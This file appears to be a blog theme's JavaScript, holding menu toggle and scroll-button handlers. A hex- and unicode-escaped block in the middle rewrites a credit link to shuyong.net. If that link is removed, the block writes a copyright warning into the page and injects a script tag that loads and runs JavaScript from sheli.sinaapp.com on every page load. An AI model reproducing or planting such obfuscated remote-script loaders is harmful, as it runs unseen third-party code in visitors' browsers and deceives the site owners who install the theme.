function Mnav(){
nav = document.getElementById("m-nav");
if(nav.style.display == "none"){
nav.style.display = "block";}
else{
nav.style.display = "none";
}}

jQuery(document).ready(function($) {
$body = (window.opera) ? (document.compatMode == "CSS1Compat" ? $("html") : $("body")) : $("html,body");
$("#shang").mouseover(function() {
up()
    }).mouseout(function() {
        clearTimeout(fq)
    }).click(function() {
        $body.animate({
            scrollTop: 0
        },
        400)
    });
    $("#xia").mouseover(function() {
        dn()
    }).mouseout(function() {
        clearTimeout(fq)
    }).click(function() {
        $body.animate({
            scrollTop: $(document).height()
        },
        400)
    });
    $("#comt").click(function() {
        $body.animate({
            scrollTop: $("#respond").offset().top
        },
        400)
    });});$(window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"])["\x72\x65\x61\x64\x79"](function(){$("\x23\x78\x6a")["\x65\x61\x63\x68"](function(){$(this)["\x61\x74\x74\x72"]("\x68\x72\x65\x66", "\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x73\x68\x75\x79\x6f\x6e\x67\x2e\x6e\x65\x74");$("\x23\x78\x6a")["\x68\x74\x6d\x6c"]("\u820d\u529b\u535a\u5ba2")})});function xj0(SfQG$w1){var CodTdu2 = window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64"](SfQG$w1);if(CodTdu2){return true}else{return false}};$(function(){if(!xj0("\x78\x6a")) window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65\x6c\x6e"]("\x3c\x63\x65\x6e\x74\x65\x72\x3e\u4fee\u6539\u7248\u6743\u6216\u53bb\u9664\u7248\u6743\u540e\u5c06\u4f1a\u51fa\u73b0\u6b64\u9875\u9762\uff0c\u6062\u590d\u9ed8\u8ba4\u7684\u5c31\u53ef\u4ee5\u4e86\x3c\x2f\x63\x65\x6e\x74\x65\x72\x3e\x3c\x62\x72 \x2f\x3e\x3c\x73\x63\x72\x69\x70\x74 \x74\x79\x70\x65\x3d\"\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\" \x73\x72\x63\x3d\"\x68\x74\x74\x70\x3a\x2f\x2f\x73\x68\x65\x6c\x69\x2e\x73\x69\x6e\x61\x61\x70\x70\x2e\x63\x6f\x6d\x2f\x6a\x73\x2d\x73\x68\x65\x6c\x69\x2f\x6b\x73\x61\x6e\x5f\x74\x62\x2e\x6a\x73\"\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e")})
function up() {
    $wd = $(window);
    $wd.scrollTop($wd.scrollTop() - 3);
    fq = setTimeout(up, 0);
}
function dn() {
    $wd = $(window);
    $wd.scrollTop($wd.scrollTop() + 2);
    fq = setTimeout(dn, 50);
}


function code() {
document.writeln("<style type=\"text/css\">#sycode{width:95%;height:200px;padding:10px;font-size:12px;}</style>");
document.writeln("<script type=\"text/javascript\">function runEx(cod1)  {cod=document.getElementById(cod1);var code=cod.value;if (code!=\"\"){var newwin=window.open(\'\',\'\',\'\');newwin.opener = null;newwin.document.write(code);newwin.document.close();}}</script>");
}